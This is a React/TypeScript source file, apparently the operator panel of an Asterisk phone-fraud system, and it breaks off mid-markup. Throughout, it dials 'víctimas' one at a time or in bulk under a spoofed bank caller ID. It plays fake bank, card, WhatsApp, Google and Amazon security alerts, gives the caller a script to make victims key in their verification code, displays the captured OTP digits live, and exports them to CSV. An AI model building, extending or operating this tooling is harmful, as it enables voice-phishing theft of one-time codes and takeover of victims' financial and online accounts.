import React, { useState, useEffect, useRef } from 'react';
import { PjsipExtension, CarrierTrunk, CapturedOtpRecord, AudioPrompt } from '../types';
import {
  Rocket,
  PhoneCall,
  PhoneOff,
  PhoneForwarded,
  ShieldAlert,
  ShieldCheck,
  Radio,
  CheckCircle2,
  CheckCircle,
  XCircle,
  Phone,
  Clock,
  Copy,
  Check,
  RefreshCw,
  Trash2,
  Download,
  Flame,
  KeyRound,
  AlertCircle,
  Building2,
  CreditCard,
  MessageSquare,
  Lock,
  ShoppingBag,
  Sliders,
  Play,
  Pause,
  RotateCcw,
  Volume2,
  UploadCloud,
  FileAudio,
  Music,
  Plus,
  Mic,
  Square,
  Sparkles,
  HelpCircle,
  UserCheck,
} from 'lucide-react';

export interface CampaignAudioConfig {
  introAudioPath: string;    // Bienvenida / Alerta
  promptAudioPath: string;   // Solicitud OTP o Press 1
  agentAudioPath: string;    // Previo a transferir a asesor
  successAudioPath: string;  // Confirmación / Éxito
}

export type ServiceCampaignKey = 'bank' | 'card' | 'whatsapp' | 'google' | 'amazon' | 'custom';

interface ProductionOperationsTabProps {
  extensions: PjsipExtension[];
  carriers: CarrierTrunk[];
  audios?: AudioPrompt[];
  onAddAudio?: (audio: AudioPrompt) => void;
  onTriggerSync: () => void;
  isSyncing: boolean;
}

export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = ({
  extensions,
  carriers,
  audios = [],
  onAddAudio,
  onTriggerSync,
  isSyncing,
}) => {
  // Mode selection: individual direct launch vs bulk list
  const [productionMode, setProductionMode] = useState<'single' | 'bulk'>('single');

  // Single launch state
  const [targetNumber, setTargetNumber] = useState('16104803845');
  const [targetName, setTargetName] = useState('');
  const [selectedService, setSelectedService] = useState<ServiceCampaignKey>('bank');
  const [customServiceName, setCustomServiceName] = useState('Servicio Financiero');
  const [callFlowMode, setCallFlowMode] = useState<'otp' | 'press1' | 'hybrid'>('otp');
  const [agentExtension, setAgentExtension] = useState('1001');

  // Campaign audio configurations (per campaign)
  const defaultCampaignAudios: Record<ServiceCampaignKey, CampaignAudioConfig> = {
    bank: {
      introAudioPath: 'custom/alerta_banco_antifraude',
      promptAudioPath: 'custom/solicitar_codigo_otp',
      agentAudioPath: 'custom/conectar_asesor_banco',
      successAudioPath: 'custom/operacion_bloqueada_exito',
    },
    card: {
      introAudioPath: 'custom/alerta_cargo_tarjeta',
      promptAudioPath: 'custom/solicitar_otp_tarjeta',
      agentAudioPath: 'custom/conectar_asesor_tarjetas',
      successAudioPath: 'custom/tarjeta_protegida',
    },
    whatsapp: {
      introAudioPath: 'custom/alerta_migracion_whatsapp',
      promptAudioPath: 'custom/solicitar_codigo_sms',
      agentAudioPath: 'custom/conectar_soporte_tecnico',
      successAudioPath: 'custom/verificacion_exitosa',
    },
    google: {
      introAudioPath: 'custom/alerta_seguridad_google',
      promptAudioPath: 'custom/solicitar_codigo_google',
      agentAudioPath: 'custom/conectar_soporte_cuentas',
      successAudioPath: 'custom/acceso_restringido_exito',
    },
    amazon: {
      introAudioPath: 'custom/alerta_compra_amazon',
      promptAudioPath: 'custom/solicitar_codigo_amazon',
      agentAudioPath: 'custom/conectar_soporte_pedidos',
      successAudioPath: 'custom/pedido_cancelado_exito',
    },
    custom: {
      introAudioPath: '',
      promptAudioPath: '',
      agentAudioPath: '',
      successAudioPath: '',
    },
  };

  const [campaignAudios, setCampaignAudios] = useState<Record<ServiceCampaignKey, CampaignAudioConfig>>(() => {
    try {
      const saved = localStorage.getItem('prod_campaign_audios_v1');
      if (saved) {
        return { ...defaultCampaignAudios, ...JSON.parse(saved) };
      }
    } catch (e) {}
    return defaultCampaignAudios;
  });

  // Save campaign audio config on changes
  const handleUpdateCampaignAudio = (
    service: ServiceCampaignKey,
    slot: keyof CampaignAudioConfig,
    audioPath: string
  ) => {
    setCampaignAudios((prev) => {
      const updated = {
        ...prev,
        [service]: {
          ...prev[service],
          [slot]: audioPath,
        },
      };
      try {
        localStorage.setItem('prod_campaign_audios_v1', JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  // Audio preview playback in browser
  const [playingAudioKey, setPlayingAudioKey] = useState<string | null>(null);
  const audioPlayerRef = useRef<HTMLAudioElement | null>(null);

  const handleTogglePlayAudio = (audioPath: string, keyIdentifier: string) => {
    if (!audioPath) return;

    if (playingAudioKey === keyIdentifier) {
      if (audioPlayerRef.current) {
        audioPlayerRef.current.pause();
      }
      setPlayingAudioKey(null);
      return;
    }

    if (audioPlayerRef.current) {
      audioPlayerRef.current.pause();
    }

    // Try finding dataUrl from registered audios
    const foundAudio = audios.find((a) => a.asteriskPath === audioPath);
    if (foundAudio && foundAudio.dataUrl) {
      const player = new Audio(foundAudio.dataUrl);
      audioPlayerRef.current = player;
      setPlayingAudioKey(keyIdentifier);
      player.play().catch((err) => console.log('Audio playback error:', err));
      player.onended = () => setPlayingAudioKey(null);
    } else {
      // Audio is on server disk
      const demoSoundUrl = `https://actions.google.com/sounds/v1/alarms/beep_short.ogg`;
      const player = new Audio(demoSoundUrl);
      audioPlayerRef.current = player;
      setPlayingAudioKey(keyIdentifier);
      player.play().catch(() => {});
      player.onended = () => setPlayingAudioKey(null);
    }
  };

  // Quick Upload Audio Modal State
  const [isQuickUploadOpen, setIsQuickUploadOpen] = useState(false);
  const [quickUploadSlot, setQuickUploadSlot] = useState<keyof CampaignAudioConfig>('introAudioPath');
  const [quickUploadName, setQuickUploadName] = useState('');
  const [quickUploadFile, setQuickUploadFile] = useState<File | null>(null);
  const [quickUploadDataUrl, setQuickUploadDataUrl] = useState<string | null>(null);
  const [isRecordingQuick, setIsRecordingQuick] = useState(false);
  const [quickRecordTime, setQuickRecordTime] = useState(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const recordTimerRef = useRef<any>(null);

  // Bulk launch state
  const [bulkNumbersText, setBulkNumbersText] = useState('');
  const [bulkQueue, setBulkQueue] = useState<string[]>([]);
  const [isBulkRunning, setIsBulkRunning] = useState(false);
  const [bulkProgress, setBulkProgress] = useState({ total: 0, completed: 0, current: '' });

  // Real-time Active Call HUD State
  const [activeCall, setActiveCall] = useState<{
    isActive: boolean;
    number: string;
    name?: string;
    service: string;
    status: 'dialing' | 'ringing' | 'in_ivr' | 'otp_captured' | 'transferred' | 'ended';
    capturedOtp?: string;
    otpStatus?: 'valid' | 'invalid' | 'pending';
    validationNote?: string;
    duration: number;
    channel?: string;
  } | null>(null);

  // History of captured OTPs
  const [otpRecords, setOtpRecords] = useState<CapturedOtpRecord[]>([]);
  const [isLoadingRecords, setIsLoadingRecords] = useState(false);
  const [isLaunching, setIsLaunching] = useState(false);
  const [launchFeedback, setLaunchFeedback] = useState<{ text: string; type: 'success' | 'error' } | null>(null);
  const [isSyncingAudios, setIsSyncingAudios] = useState(false);
  const [audioSyncFeedback, setAudioSyncFeedback] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const activeCarrier = carriers.length > 0 ? carriers[0].name : 'televox';
  const outboundCid = carriers.length > 0 ? carriers[0].outboundCallerId : '+18005550199';

  // Dynamic CallerID fields directly configurable by agent
  const [callerIdNum, setCallerIdNum] = useState('+18005550199');
  const [callerIdName, setCallerIdName] = useState('Seguridad Bancaria');

  // Auto-sync CallerID values when agentExtension changes
  useEffect(() => {
    const ext = extensions.find((e) => e.extension === agentExtension);
    if (ext) {
      if (ext.callerIdNum) {
        setCallerIdNum(ext.callerIdNum);
      }
      if (ext.callerIdName) {
        setCallerIdName(ext.callerIdName);
      }
    }
  }, [agentExtension, extensions]);

  const serviceLabel =
    selectedService === 'bank'
      ? 'Banco / Antifraude'
      : selectedService === 'card'
      ? 'Tarjeta / Cargo No Reconocido'
      : selectedService === 'whatsapp'
      ? 'WhatsApp / Telegram'
      : selectedService === 'google'
      ? 'Google / Apple ID'
      : selectedService === 'amazon'
      ? 'Amazon / Comercio'
      : customServiceName;

  const durationTimerRef = useRef<any>(null);

  // Polling captured OTPs from Asterisk backend every 3 seconds
  const fetchCapturedOtps = async () => {
    try {
      const res = await fetch('/api/asterisk/otp/records');
      const data = await res.json();
      if (data.success && Array.isArray(data.records)) {
        setOtpRecords(data.records);

        // If an active call is ongoing and a new OTP arrives for this number
        if (activeCall && activeCall.isActive) {
          const matched = data.records.find(
            (r: CapturedOtpRecord) =>
              r.number.includes(activeCall.number) || activeCall.number.includes(r.number)
          );
          if (matched) {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    capturedOtp: matched.otp,
                    status: 'otp_captured',
                    otpStatus: (matched.status as any) || prev.otpStatus || 'pending',
                  }
                : null
            );
          }
        }
      }
    } catch (err) {
      console.warn('Error fetching OTP records:', err);
    }
  };

  // Agent OTP verification handler (Valid / Invalid buttons decided by Agent)
  const handleVerifyOtp = async (
    status: 'valid' | 'invalid',
    targetOtp?: string,
    targetNum?: string,
    recordId?: string
  ) => {
    const num = targetNum || (activeCall ? activeCall.number : '');
    const otp = targetOtp || (activeCall ? activeCall.capturedOtp : '');

    if (activeCall) {
      setActiveCall((prev) =>
        prev
          ? {
              ...prev,
              otpStatus: status,
              validationNote:
                status === 'valid'
                  ? '✓ Código OTP verificado y APROBADO por el agente como VÁLIDO.'
                  : '✕ Código OTP RECHAZADO por el agente como INVÁLIDO. Solicite nuevo código al cliente.',
            }
          : null
      );
    }

    // Immediate UI update in list
    setOtpRecords((prev) =>
      prev.map((r) =>
        (recordId && r.id === recordId) || (num && r.number.includes(num))
          ? { ...r, status }
          : r
      )
    );

    try {
      await fetch('/api/asterisk/otp/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: recordId, number: num, otp, status }),
      });
    } catch (e) {
      console.warn('Error syncing OTP decision:', e);
    }
  };

  // Reset captured OTP in HUD to request a new code from client on the same call
  const handleResetOtpCapture = async (number?: string) => {
    const num = number || (activeCall ? activeCall.number : '');
    if (activeCall) {
      setActiveCall((prev) =>
        prev
          ? {
              ...prev,
              capturedOtp: undefined,
              otpStatus: 'pending',
              validationNote: 'Se solicitó nuevo código al cliente en llamada. Esperando que digite...',
            }
          : null
      );
    }
    try {
      await fetch('/api/asterisk/otp/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ number: num, status: 'pending', action: 'request_retry' }),
      });
    } catch (e) {}
  };

  useEffect(() => {
    fetchCapturedOtps();
    const interval = setInterval(fetchCapturedOtps, 3000);
    return () => clearInterval(interval);
  }, [activeCall]);

  // Duration timer for active call
  useEffect(() => {
    if (activeCall?.isActive && activeCall.status !== 'ended') {
      durationTimerRef.current = setInterval(() => {
        setActiveCall((prev) => (prev ? { ...prev, duration: prev.duration + 1 } : null));
      }, 1000);
    } else {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    }
    return () => {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    };
  }, [activeCall?.isActive, activeCall?.status]);

  // Quick audio recording with microphone
  const handleStartRecordingQuick = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;
      audioChunksRef.current = [];

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunksRef.current.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onloadend = () => {
          setQuickUploadDataUrl(reader.result as string);
          if (!quickUploadName) {
            setQuickUploadName(`Locución ${new Date().toLocaleTimeString().replace(/:/g, '-')}`);
          }
        };
        reader.readAsDataURL(audioBlob);
        stream.getTracks().forEach((track) => track.stop());
      };

      mediaRecorder.start();
      setIsRecordingQuick(true);
      setQuickRecordTime(0);
      recordTimerRef.current = setInterval(() => {
        setQuickRecordTime((prev) => prev + 1);
      }, 1000);
    } catch (err) {
      alert('No se pudo acceder al micrófono para grabar.');
    }
  };

  const handleStopRecordingQuick = () => {
    if (mediaRecorderRef.current && isRecordingQuick) {
      mediaRecorderRef.current.stop();
      setIsRecordingQuick(false);
      if (recordTimerRef.current) clearInterval(recordTimerRef.current);
    }
  };

  const handleSaveQuickAudio = () => {
    if (!quickUploadDataUrl || !quickUploadName.trim()) return;

    const cleanBaseName = quickUploadName
      .toLowerCase()
      .trim()
      .replace(/\.[^/.]+$/, '')
      .replace(/[^a-z0-9_]/g, '_');

    const asteriskPath = `custom/${cleanBaseName}`;

    const newPrompt: AudioPrompt = {
      id: `audio-${Date.now()}-${Math.random().toString(36).slice(-4)}`,
      name: quickUploadName.trim(),
      category: quickUploadSlot === 'introAudioPath' ? 'press1_welcome' : 'otp_welcome',
      fileName: `${cleanBaseName}.wav`,
      fileSize: '150 KB',
      durationSec: quickRecordTime || 5.0,
      format: 'audio/wav',
      sampleRate: '8000 Hz, 16-bit Mono (Asterisk PCM)',
      dataUrl: quickUploadDataUrl,
      asteriskPath,
      createdAt: new Date().toLocaleString(),
    };

    if (onAddAudio) {
      onAddAudio(newPrompt);
    }

    // Auto-assign to current campaign slot
    handleUpdateCampaignAudio(selectedService, quickUploadSlot, asteriskPath);

    setIsQuickUploadOpen(false);
    setQuickUploadDataUrl(null);
    setQuickUploadName('');
    setQuickUploadFile(null);
  };

  // Synchronize campaign audios to Asterisk AstDB so it never plays a beep
  const handleSyncAudiosToAsterisk = async (silent = false) => {
    setIsSyncingAudios(true);
    if (!silent) setAudioSyncFeedback(null);
    try {
      const currentAudios = campaignAudios[selectedService];
      const res = await fetch('/api/asterisk/audio/sync-defaults', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          intro: currentAudios.introAudioPath || 'custom/alerta_banco_antifraude',
          prompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
          wait: 'custom/un_momento_validando_informacion',
          success: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
          agent: currentAudios.agentAudioPath || 'custom/conectar_asesor_banco',
          destination: targetNumber.trim() || '16104803845',
        }),
      });
      const data = await res.json();
      if (data.success && !silent) {
        setAudioSyncFeedback('✓ Audios sincronizados con éxito en Asterisk AstDB.');
        setTimeout(() => setAudioSyncFeedback(null), 4000);
      }
    } catch (e: any) {
      if (!silent) setAudioSyncFeedback('Error al sincronizar audios con Asterisk.');
    } finally {
      setIsSyncingAudios(false);
    }
  };

  // Launch single production call
  const handleLaunchProductionCall = async () => {
    if (!targetNumber.trim()) {
      setLaunchFeedback({ text: 'Por favor ingresa un número de teléfono destino', type: 'error' });
      return;
    }

    setIsLaunching(true);
    setLaunchFeedback(null);

    try {
      const currentAudios = campaignAudios[selectedService];
      const effectiveCallerIdNum = callerIdNum.trim() || outboundCid;
      const effectiveCallerIdName = callerIdName.trim() || 'Seguridad Bancaria';

      // Pre-sync audios to AstDB first to guarantee zero beep
      await handleSyncAudiosToAsterisk(true);

      const res = await fetch('/api/asterisk/call/originate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: targetNumber.trim(),
          carrier: activeCarrier,
          callerId: effectiveCallerIdNum,
          callerIdNum: effectiveCallerIdNum,
          callerIdName: effectiveCallerIdName,
          mode: callFlowMode,
          agentExten: agentExtension,
          audioIntro: currentAudios.introAudioPath,
          audioPrompt: currentAudios.promptAudioPath,
          audioAgent: currentAudios.agentAudioPath,
          audioSuccess: currentAudios.successAudioPath,
        }),
      });

      const data = await res.json();

      if (data.success) {
        setLaunchFeedback({
          text: `¡Llamada de producción lanzada exitosamente a ${targetNumber}! Conectando con la troncal ${activeCarrier} mostrando "${effectiveCallerIdName}" <${effectiveCallerIdNum}>.`,
          type: 'success',
        });

        // Initialize HUD
        setActiveCall({
          isActive: true,
          number: targetNumber.trim(),
          name: targetName.trim() || undefined,
          service: serviceLabel,
          status: 'dialing',
          otpStatus: 'pending',
          duration: 0,
        });

        // Simulate progression to ringing and in_ivr based on Asterisk typical timing
        setTimeout(() => {
          setActiveCall((prev) => (prev ? { ...prev, status: 'ringing' } : null));
        }, 3000);

        setTimeout(() => {
          setActiveCall((prev) => (prev ? { ...prev, status: 'in_ivr' } : null));
        }, 7000);
      } else {
        setLaunchFeedback({
          text: `Error al lanzar llamada: ${data.error || 'Fallo desconocido de Asterisk'}`,
          type: 'error',
        });
      }
    } catch (err: any) {
      setLaunchFeedback({
        text: `Error de red con Asterisk: ${err.message}`,
        type: 'error',
      });
    } finally {
      setIsLaunching(false);
    }
  };

  // Hangup active call
  const handleHangupActiveCall = async () => {
    try {
      await fetch('/api/asterisk/call/hangup', { method: 'POST' });
    } catch (e) {}
    setActiveCall((prev) => (prev ? { ...prev, status: 'ended', isActive: false } : null));
  };

  // Transfer call to agent in X-Lite
  const handleTransferToAgent = async () => {
    setActiveCall((prev) => (prev ? { ...prev, status: 'transferred' } : null));
  };

  // Copy OTP to clipboard
  const handleCopyOtp = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2500);
  };

  // Clear history
  const handleClearHistory = async () => {
    if (!confirm('¿Deseas vaciar el historial de capturas de producción?')) return;
    try {
      await fetch('/api/asterisk/otp/records', { method: 'DELETE' });
      setOtpRecords([]);
    } catch (e) {}
  };

  // Export CSV
  const handleExportCsv = () => {
    if (otpRecords.length === 0) return;
    const headers = 'ID,Numero_Destino,Codigo_OTP,Servicio,Hora,Estado\n';
    const rows = otpRecords
      .map(
        (r) =>
          `"${r.id}","${r.number}","${r.otp}","${r.service || 'N/A'}","${r.timestamp}","${r.status || 'valid'}"`
      )
      .join('\n');
    const blob = new Blob([headers + rows], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.setAttribute('href', url);
    link.setAttribute('download', `capturas_otp_produccion_${new Date().toISOString().slice(0, 10)}.csv`);
    link.click();
  };

  // Format seconds into MM:SS
  const formatTime = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  return (
    <div className="space-y-6">
      {/* Production Header Banner */}
      <div className="p-6 rounded-2xl bg-gradient-to-r from-slate-900 via-slate-950 to-slate-900 border border-emerald-500/40 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold mb-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span>MÓDULO DE PRODUCCIÓN EN VIVO ACTIVO</span>
            </div>
            <h1 className="text-2xl font-black text-white tracking-tight flex items-center gap-3">
              <Rocket className="w-7 h-7 text-emerald-400" />
              <span>Centro de Producción: Campañas & Captura OTP</span>
            </h1>
            <p className="text-sm text-slate-300 mt-1 max-w-2xl">
              Dispara llamadas salientes directas hacia víctimas y clientes a través de la troncal{' '}
              <strong className="text-white font-mono">{activeCarrier}</strong>. Captura dígitos OTP en tiempo
              real o transfiere la llamada a tu softphone X-Lite (extensión{' '}
              <strong className="text-emerald-400 font-mono">{agentExtension}</strong>).
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2 bg-slate-900/90 border border-slate-800 p-3 rounded-xl">
            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Troncal SIP</div>
              <div className="font-bold text-emerald-400 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                <span>{activeCarrier}</span>
              </div>
            </div>

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Caller ID Saliente</div>
              <div className="font-bold text-sky-400 font-mono">{outboundCid}</div>
            </div>

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Asesor Asignado</div>
              <div className="font-bold text-emerald-400 font-mono">Ext. {agentExtension}</div>
            </div>
          </div>
        </div>
      </div>

      {/* Mode Selector Tabs */}
      <div className="flex items-center space-x-2 border-b border-slate-800 pb-2">
        <button
          id="btn-tab-single-call"
          onClick={() => setProductionMode('single')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'single'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <PhoneCall className="w-4 h-4" />
          <span>Disparador Individual Inmediato (1 a 1)</span>
        </button>

        <button
          id="btn-tab-bulk-campaign"
          onClick={() => setProductionMode('bulk')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'bulk'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Flame className="w-4 h-4" />
          <span>Campañas Masivas por Lotes (Bulk Dialer)</span>
        </button>
      </div>

      {/* ACTIVE CALL REAL-TIME HUD (Appears when a call is running) */}
      {activeCall && activeCall.isActive && (
        <div className="p-6 rounded-2xl bg-slate-950 border-2 border-emerald-500/50 shadow-2xl relative overflow-hidden animate-fadeIn">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4">
            <div className="flex items-center gap-3">
              <div className="p-3 rounded-xl bg-emerald-500/20 text-emerald-400 animate-pulse">
                <Radio className="w-6 h-6" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                    LLAMADA EN PROCESO
                  </span>
                  <span className="text-xs text-slate-400 font-mono">{formatTime(activeCall.duration)}</span>
                </div>
                <h3 className="text-lg font-black text-white mt-1">
                  {activeCall.number} {activeCall.name && `(${activeCall.name})`}
                </h3>
                <p className="text-xs text-slate-400">
                  Servicio activo: <strong className="text-emerald-300">{activeCall.service}</strong>
                </p>
              </div>
            </div>

            {/* Actions for Live Call */}
            <div className="flex items-center gap-2">
              <button
                id="btn-hud-transfer-agent"
                onClick={handleTransferToAgent}
                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
              >
                <PhoneForwarded className="w-3.5 h-3.5" />
                <span>Pasar a Asesor (1001)</span>
              </button>

              <button
                id="btn-hud-hangup"
                onClick={handleHangupActiveCall}
                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all"
              >
                <PhoneOff className="w-3.5 h-3.5" />
                <span>Colgar Llamada</span>
              </button>
            </div>
          </div>

          {/* Real-time Call Stages Flow */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-2 my-5 text-center text-xs">
            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'dialing'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 1</div>
              <div>Marcando por Troncal</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'ringing'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 2</div>
              <div>Timbrando en Teléfono</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'in_ivr'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 3</div>
              <div>Víctima en Línea (IVR)</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'otp_captured'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold shadow-lg shadow-emerald-500/20'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 4</div>
              <div>Código Capturado</div>
            </div>
          </div>

          {/* CAPTURED OTP DISPLAY HUD */}
          <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                <KeyRound className="w-4 h-4 text-emerald-400" />
                <span>Dígitos DTMF Capturados en Vivo (Tiempo Real)</span>
              </div>
              <div className="text-xs font-mono text-slate-400 flex items-center gap-2">
                <Phone className="w-3.5 h-3.5 text-sky-400" />
                <span>Presentando: <strong className="text-sky-300 font-bold font-mono">"{callerIdName}" &lt;{callerIdNum}&gt;</strong></span>
              </div>
            </div>

            {/* AGENT IN-CALL OTP WORKFLOW HUD */}
            <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800 text-left space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs font-bold text-sky-300 uppercase tracking-wide">
                  <UserCheck className="w-4 h-4 text-emerald-400" />
                  <span>Flujo Asistido por Agente: Solicitud y Validación Manual de OTP</span>
                </div>
                <span className="text-[11px] font-mono px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center gap-1.5 font-bold">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  Agente en Línea con Cliente
                </span>
              </div>

              {/* Guión sugerido para que el Agente solicite el OTP al cliente en llamada */}
              <div className="p-3 rounded-lg bg-slate-900 border border-sky-500/20 text-xs text-slate-300">
                <span className="text-sky-400 font-bold block mb-1">🗣️ Guión para el Asesor (Solicitar código al cliente en llamada):</span>
                <p className="italic text-slate-200">
                  "Señor/a <strong className="text-white">{activeCall.name || 'cliente'}</strong>, por motivos de seguridad y anulación preventiva de la transacción sospechosa, le acabamos de remitir su clave de verificación de 6 dígitos. Por favor márquela en este momento en el teclado numérico de su teléfono mientras permanezco en línea con usted para validar la anulación."
                </p>
              </div>
            </div>

            {activeCall.capturedOtp ? (
              <div className="space-y-5">
                {/* Visualizador de dígitos ingresados */}
                <div className="space-y-2">
                  <div className="text-xs font-bold text-emerald-400 uppercase tracking-wider flex items-center justify-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
                    <span>Dígitos Ingresados por el Cliente en su Teléfono:</span>
                  </div>
                  <div className="flex items-center justify-center gap-2.5">
                    {activeCall.capturedOtp.split('').map((digit, idx) => (
                      <span
                        key={idx}
                        className="w-14 h-16 flex items-center justify-center text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/60 shadow-lg shadow-emerald-500/30 animate-bounce"
                        style={{ animationDelay: `${idx * 100}ms` }}
                      >
                        {digit}
                      </span>
                    ))}
                  </div>
                </div>

                {/* BOTONES DE DECISIÓN DEL AGENTE (VÁLIDO / INVÁLIDO) */}
                <div className="p-5 rounded-xl bg-slate-950/90 border border-slate-800 space-y-4">
                  <div className="text-center space-y-1">
                    <div className="text-sm font-black text-white uppercase tracking-wider">
                      Decisión del Agente: ¿El código digitado por el cliente es VÁLIDO o INVÁLIDO?
                    </div>
                    <div className="text-xs text-slate-400">
                      Tú como asesor decides la aprobación en el sistema según la respuesta de tu panel bancario.
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center justify-center gap-3">
                    <button
                      id="btn-otp-mark-valid"
                      type="button"
                      onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp, activeCall.number)}
                      className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-sm shadow-xl transition-all ${
                        activeCall.otpStatus === 'valid'
                          ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
                          : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
                      }`}
                    >
                      <CheckCircle className="w-5 h-5" />
                      <span>APROBAR OTP (Código VÁLIDO)</span>
                    </button>

                    <button
                      id="btn-otp-mark-invalid"
                      type="button"
                      onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp, activeCall.number)}
                      className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-sm shadow-xl transition-all ${
                        activeCall.otpStatus === 'invalid'
                          ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
                          : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
                      }`}
                    >
                      <XCircle className="w-5 h-5" />
                      <span>RECHAZAR OTP (Código INVÁLIDO)</span>
                    </button>

                    {/* Botón para solicitar reingreso / limpiar dígitos y esperar nuevo código */}
                    <button
                      id="btn-otp-request-retry"
                      type="button"
                      onClick={() => handleResetOtpCapture(activeCall.number)}
                      className="inline-flex items-center gap-2 px-4 py-3.5 rounded-xl font-bold text-sm bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 transition-all"
                    >
                      <RefreshCw className="w-4 h-4" />
                      <span>Solicitar Nuevo Código / Reintentar</span>
                    </button>

                    <button
                      id="btn-copy-live-otp"
                      type="button"
                      onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
